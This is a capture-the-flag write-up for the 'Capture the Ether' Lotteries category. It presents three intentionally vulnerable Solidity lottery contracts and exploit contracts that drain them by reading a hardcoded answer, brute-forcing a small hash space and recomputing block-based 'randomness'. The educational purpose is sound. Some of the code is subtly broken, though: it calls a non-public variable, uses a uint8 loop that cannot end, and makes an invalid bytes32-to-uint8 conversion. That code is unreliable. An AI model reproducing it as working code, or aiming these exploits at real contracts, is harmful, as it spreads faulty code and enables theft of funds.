# Capture the Ether: Lotteries Category

## Introduction
The Lotteries category focuses on randomness vulnerabilities and game theory exploits. These challenges teach you why blockchain randomness is broken and how to exploit predictable "random" numbers.

## Challenge 1: Guess the Number

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract GuessTheNumberChallenge {
    uint8 answer = 42; // The answer is hardcoded!

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether, "Must send 1 ETH");
        if (n == answer) {
            payable(msg.sender).transfer(2 ether);
        }
    }
}
```

**Goal:** Guess the number (it's always 42).

**Vulnerability:** The answer is hardcoded in the contract! Anyone can read it.

**Exploit:**
```solidity
contract GuessTheNumberExploit {
    function exploit(GuessTheNumberChallenge target) public payable {
        target.guess{value: 1 ether}(42);
    }
}
```

---

## Challenge 2: Guess the Secret Number

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract GuessTheSecretNumberChallenge {
    bytes32 answerHash = keccak256(abi.encodePacked(42));

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        if (keccak256(abi.encodePacked(n)) == answerHash) {
            payable(msg.sender).transfer(2 ether);
        }
    }
}
```

**Goal:** Guess the secret number (0-255).

**Vulnerability:** The number is only 0-255, so we can brute-force it!

**Exploit:**
```solidity
contract GuessTheSecretNumberExploit {
    function exploit(GuessTheSecretNumberChallenge target) public payable {
        // Try all numbers from 0 to 255
        for (uint8 i = 0; i < 256; i++) {
            if (keccak256(abi.encodePacked(i)) == target.answerHash()) {
                target.guess{value: 1 ether}(i);
                return;
            }
        }
    }
}
```

---

## Challenge 3: Guess the Random Number

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract GuessTheRandomNumberChallenge {
    uint8 answer;

    constructor() payable {
        answer = uint8(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        if (n == answer) {
            payable(msg.sender).transfer(2 ether);
        }
    }
}
```

**Goal:** Guess the "random" number.

**Vulnerability:** The "random" number is generated in the constructor using blockhash and block.timestamp. Since the constructor runs in a specific block, we can calculate the exact same value!

**Exploit:**
```solidity
contract GuessTheRandomNumberExploit {
    function exploit(GuessTheRandomNumberChallenge target, uint256 blockNumber, uint256 timestamp) public payable {
        // Recreate the same "random" calculation
        uint8 answer = uint8(keccak256(abi.encodePacked(blockhash(blockNumber), timestamp)));
        target.guess{value: 1 ether}(answer);
    }
}
```

## Key Takeaways from Lotteries
- **Hardcoded secrets are not secret:** Anyone can read the contract code.
- **Small search spaces are vulnerable:** If a secret is 0-255, brute-force it.
- **Block-based randomness is predictable:** blockhash and block.timestamp can be calculated.
- **Never use on-chain data for randomness:** Always use Chainlink VRF or similar.
- **Hash functions are one-way but not magic:** If the input space is small, you can brute-force the hash.
- **Lesson learned:** True randomness requires external, unpredictable sources.

## Next Category: Math
The Math category is even harder, focusing on integer overflow, underflow, and mathematical exploits. Get ready!